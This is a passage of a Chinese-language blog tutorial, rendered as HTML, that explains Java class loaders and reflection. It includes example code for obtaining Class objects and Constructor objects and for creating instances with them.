class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 该代码需要在jdk8(jre8)环境下运行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前类的类加载器</span></span><br><span class="line">        <span class="comment">//ClassLoader currentClassLoader = ClassLoader.getSystemClassLoader();</span></span><br><span class="line">        ClassLoader currentClassLoader = ClassLoaderDemo.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// currentClassLoader = sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line">        System.out.println(<span class="string">&quot;currentClassLoader = &quot;</span> + currentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前类类加载器的父亲（不是java中的父类/继承；而是jvm底层设计中的父亲，通过一个parent属性体现）</span></span><br><span class="line">        ClassLoader parentClassLoader = currentClassLoader.getParent();</span><br><span class="line">        <span class="comment">// parentClassLoader = sun.misc.Launcher$ExtClassLoader@4554617c</span></span><br><span class="line">        System.out.println(<span class="string">&quot;parentClassLoader = &quot;</span> + parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//extend</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前类加载器的父亲的父亲</span></span><br><span class="line">        <span class="comment">// BootstrapClassloader 是由C++开发的，是JVM的一部分，而不是Java体系中的一个类</span></span><br><span class="line">        <span class="comment">// 这里的Null并不表示空无一物，而是无法用Java体系去描述；</span></span><br><span class="line">        ClassLoader grandfatherClassLoader = parentClassLoader.getParent();</span><br><span class="line">        <span class="comment">// grandfatherClassLoader = null</span></span><br><span class="line">        System.out.println(<span class="string">&quot;grandfatherClassLoader = &quot;</span> + grandfatherClassLoader);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// *************************这些类加载器都负责加载哪些类*********************</span></span><br><span class="line">        System.out.println(<span class="string">&quot;------------------分割线------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以通过在java命令后添加 -verbose:class -verbose:gc 参数，在启动时打印出类的加载情况</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// BootStrap ClassLoader， 加载java基础类。该属性的值不可修改，即不能在java命令中指定，不是由java语言来处理的</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【BootStrap ClassLoader】加载目录：&quot;</span> + System.getProperty(<span class="string">&quot;sun.boot.class.path&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ExtendClassLoader 加载JAVA_HOME/jre/lib/ext下的jar包，可以通过 -D java.ext.dirs修改</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【ExtClassLoader】加载目录：&quot;</span> + System.getProperty(<span class="string">&quot;java.ext.dirs&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppClassLoader 加载CLASSPATH、应用下的jar包。可以通过 -D java.class.path另行指定目录</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【AppClassLoader】加载目录：&quot;</span> + currentClassLoader.getResource(<span class="string">&quot;&quot;</span>).toString());</span><br><span class="line">        <span class="comment">// 下面的获取方式在jdk8下会受idea的影响，而不准确</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;【AppClassLoader】加载目录：&quot; + System.getProperty(&quot;java.class.path&quot;));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------------分割线------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ClassLoader StringDeClassLoader = String.class.getClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;StringDeClassLoader = &quot;</span> + StringDeClassLoader);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 类加载器API <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2021/4/6 11:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">APIDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取系统类加载器/应用类加载器</span></span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">// 从当前类路径下加载该文件，并且读取成一个输入流</span></span><br><span class="line">        <span class="comment">// 不是src的源码路径，而是类路径</span></span><br><span class="line">        InputStream is = systemClassLoader.getResourceAsStream(<span class="string">&quot;prop.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Properties prop= <span class="keyword">new</span> Properties();</span><br><span class="line">        prop.load(is);</span><br><span class="line">        System.out.println(<span class="string">&quot;prop = &quot;</span> + prop);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放流</span></span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-反射"><a href="#2-反射" class="headerlink" title="2. 反射"></a>2. 反射</h2><p>在理解的基础上，能掌握最好；对之后框架原理的学习有帮助。如果仅仅是使用框架，可以不需要理解反射。</p><h3 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h3><p>在程序运行期间，对于任意一个类，我们可以使用反射技术获取其任意变量、调用其任意方法；</p><p>在不修改源代码的前提下，创建的对象、调用的方法、使用的成员变量可以随着配置文件的变化而变化。（通用性）</p><p><strong>作用：</strong></p><ol><li>反射可以无视访问权限修饰符而使用变量、调用方法；</li><li>不修改代码的前提下实现通用逻辑：动态加载(文件、传参等)，加载之后调用；加载的内容不同，调用也就不同了而变的很通用。</li></ol><p><strong>应用场景：</strong></p><pre><code>见下图</code></pre><p><img src="https://pic.imgdb.cn/item/639a8a30b1fccdcd36d2be1a.png"></p><h3 id="2-2-反射中相关类体系"><a href="#2-2-反射中相关类体系" class="headerlink" title="2.2 反射中相关类体系"></a>2.2 反射中相关类体系</h3><ul><li> 一个类的基本组成<br>（<code>java源文件/class</code>文件）<br>构造方法<br>成员变量<br>成员方法 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 成员变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 成员方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><code>Java</code>面向对象思想：万物皆对象</p><ul><li> 对应的反射的类的体系中</li></ul><p><strong>Class对象</strong>，对应<code>class</code>文件<br><strong>构造器对象</strong>，封装<strong>构造方法</strong>的对象<br><strong>成员变量对象</strong>，封装<strong>成员变量</strong> 对象<br><strong>成员方法对象</strong>，封装<strong>成员方法</strong>的对象 </p><p><img src="https://pic.imgdb.cn/item/639a8a30b1fccdcd36d2be0d.png" alt="image.png"></p><ul><li>注意 <ol><li> <code>class</code>和<code>Class</code>不同     1. <code>class</code>是字节码文件的后缀；也是<code>java</code>中的一个关键字，用于声明一个类    2. <code>Class</code>表示是是一个具体的类，可以创建该类的对象；对象里面包含了对某个类的所有描述（成员）</li><li> 为什么我们要首先获取这个<code>Class</code>对象？     -  想使用反射调用类的任意成员和方法，想让编写的代码更通用（反射的两个作用），肯定不能写死，eg：    <code>new Student()</code>  或者  <code>stu.study()</code>；而是要换种方式创建对象和调用方法等。     -  创建对象要用构造方法，调用方法要知道方法的一些参数，class文件中包含了这些所有信息，<code>class</code>文件加载到内存之后变成了<code>Class</code>对象，如果我们能获取到该对象，自然也能创建类的对象，调用其方法等等 </li></ol></li></ul><h3 id="2-3获取-Class对象"><a href="#2-3获取-Class对象" class="headerlink" title="2.3获取 Class对象"></a>2.3获取 <code>Class</code>对象</h3><p><code>Class</code>对象：<code>class</code>文件中加载到内存中成为一个<code>Class</code>对象</p><ul><li><p>获取方式 </p><blockquote><ul><li><code>类名.class</code>：<del>类加载阶段，</del>通过<code>javaBean</code>等任意一个类的<code>class</code>属性：<code>Student.class</code>可以获取对应类的<code>Class</code>对象</li><li><code>Class.forName(“全类名”)</code>：<del>（类加载完成后）</del>从类路径下加载指定的类，得到对应的类的Class对象</li><li><code>类的对象.getClass()</code>：<del>运行时阶段，</del>通过类对象的<code>getClass()</code>方法：<code>new Student().getClass()</code>，得到对应类的Class对象。</li></ul></blockquote></li><li><p> 特点：<br>某个类有且只有一个<code>Class</code>对象。 </p></li><li><p> 关联知识点<br>同步静态方法的锁对象默认是所属类的字节码对象，使用这个对象绝对可以保证锁唯一。 </p></li><li><p> 工作中怎么用？<br>最常用的是通过<code>Class.forName()</code>方式获取。 </p></li><li><p> 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.reflect01;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Class对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022/9/7 12:01</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 获取Class对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取Class对象的三种方式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式1：类名.class。不通用，不推荐。</span></span><br><span class="line">        Class&lt;Student&gt; studentClassObj1 = Student.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;studentClassObj1 = &quot;</span> + studentClassObj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式2：通过Class.forname(&quot;全类名&quot;)。推荐方式。常会配合配置文件或者参数传递，实现通用效果。</span></span><br><span class="line">        Class studentClassObj2 = Class.forName(<span class="string">&quot;com.itheima.reflect01.Student&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;studentClassObj2 = &quot;</span> + studentClassObj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式3：使用Student对象的成员方法getClass()获取Student类的字节码对象。不通用且麻烦，不推荐使用。</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        Class studentClassObj3 = stu.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;studentClassObj3 = &quot;</span> + studentClassObj3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 某个类的字节码文件对象（Class对象） 在内存中有且只有一个</span></span><br><span class="line">        System.out.println(studentClassObj1 == studentClassObj2);</span><br><span class="line">        System.out.println(studentClassObj1 == studentClassObj3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 被反射的类<code>Student</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.reflect01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学生在学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>接下来的所有对象，都要使用<code>Class</code>对象获取，也就是在使用Class对象获取类中其他成员对象。</p><h3 id="2-4-获取Constructor对象"><a href="#2-4-获取Constructor对象" class="headerlink" title="2.4 获取Constructor对象"></a>2.4 获取Constructor对象</h3><p><code>Constructor</code>对象是对类中<strong>构造方法</strong>封装之后得到的对象</p><ul><li><p> <code>Class</code>类中用于获取构<strong>造器对象</strong>的方法  </p><table><thead><tr><th>方法签名</th><th>方法说明</th></tr></thead><tbody><tr><td>Constructor[]  getConstructors()</td><td>返回所有公共构造器对象的数组</td></tr><tr><td>Constructor[]  getDeclaredConstructors()</td><td>返回所有构造器对象的数组</td></tr><tr><td>Constructor  getConstructor(Class… parameterTypes)</td><td>返回单个公共构造器对象</td></tr><tr><td>Constructor  getDeclaredConstructor(Class… parameterTypes)</td><td>返回单个构造器对象</td></tr></tbody></table></li><li><p>获取步骤 </p><ol><li>获取<code>Class</code>对象</li><li>使用获取到的<code>Class</code>对象获取<code>Constructor</code>对象</li></ol></li><li><p> 注意<br>获取所有构造器对象的时候不要传递任何参数<br>如果要获取某一个构造器对象的时候，需要按照对应构造器的形参列表传参；类型是多个<code>Class</code>类型 </p></li><li><p> 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Constructor对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//method1();</span></span><br><span class="line">        <span class="comment">//method2();</span></span><br><span class="line">        <span class="comment">//method3();</span></span><br><span class="line">        <span class="comment">//method4();</span></span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)：</span></span><br><span class="line">        <span class="comment">//  返回单个构造方法对象</span></span><br><span class="line">        <span class="comment">//1.获取Class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(String.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//   Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)：</span></span><br><span class="line">        <span class="comment">//  返回单个公共构造方法对象</span></span><br><span class="line">        <span class="comment">//1.获取Class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//小括号中,一定要跟构造方法的形参保持一致.</span></span><br><span class="line">        Constructor constructor1 = clazz.getConstructor();</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参数的类型是class类型，注意参数顺序和参数个数</span></span><br><span class="line">        Constructor constructor2 = clazz.getConstructor(String.class, <span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(constructor2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为Student类中,没有只有一个int的构造,所以这里会报错.</span></span><br><span class="line">        Constructor constructor3 = clazz.getConstructor(<span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(constructor3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt;[] getDeclaredConstructors()：</span></span><br><span class="line">        <span class="comment">//  返回所有构造方法对象的数组</span></span><br><span class="line">        <span class="comment">//1.获取Class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor : constructors) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt;[] getConstructors()：</span></span><br><span class="line">        <span class="comment">//  返回所有公共构造方法对象的数组</span></span><br><span class="line">        <span class="comment">//1. 获取Class对象</span></span><br><span class="line">        <span class="comment">//Student student = new Studnet();</span></span><br><span class="line">        <span class="comment">// 标识符不能使用关键字 class</span></span><br><span class="line">        <span class="comment">//Class class = Class.forName(&quot;com.itheima.myreflect3.Student&quot;);</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 通过当前类的Class对象获取当前类的构造器对象</span></span><br><span class="line">        Constructor[] constructors = clazz.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor : constructors) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-5-使用Constructor对象"><a href="#2-5-使用Constructor对象" class="headerlink" title="2.5 使用Constructor对象"></a>2.5 使用Constructor对象</h3><p>获取<code>Constructor</code>对象的目的：通过构造器对象，创建该构造器所属类（eg：Student）的对象 （eg：stu）</p><ul><li>API<br> <code>Object newInstance(Object… arg)</code> <ul><li> 属于<code>Constructor</code>类 </li><li> 返回值：<code>Object</code>类型，所属类的对象。因为不知道通过这次反射创建的到底是哪个类的对象（eg:<code>Student| Teacher…</code>） </li><li> 参数：<code>Object</code>类型的可变参数；调用构造方法传递实参。不能明确具体类型，所以用<code>Object</code>；不能明确个数，所以用可变参数 </li></ul></li></ul><p><code>~~Object newInstance()~~</code></p><ul><li>属于<code>Class</code>类，已被标记为过时</li><li>作用：调用无参构造器对象创建该类对象<code>≈ new Student()</code></li><li>返回值：Object类型，因为不知道通过这次反射创建的到底是哪个类的对象（eg:Student| Teacher…）</li><li>参数：调用空参，不需要传递实际参数</li><li>使用步骤 <ol><li>获取当前类（<code>Student</code>）的<code>Class</code>对象</li><li>通过当前类（<code>Student</code>）的<code>Class</code>对象获取当前类（<code>Student</code>）的构造方法对象</li><li>使用当前类（<code>Student</code>）的<code>Constructor</code>对象的<code>newInstance</code>方法创建当前类（<code>Student</code>）的对象 <ul><li>如果获取的<code>Constructor</code>对象是私有的，需要暴力反射获取访问权限后再使用</li></ul></li></ol></li><li> 演示代码（代码中类名等参数是写死的，实战中会通过传参或者读取配置，以实现动态效果） <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Constructor对象并创建对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 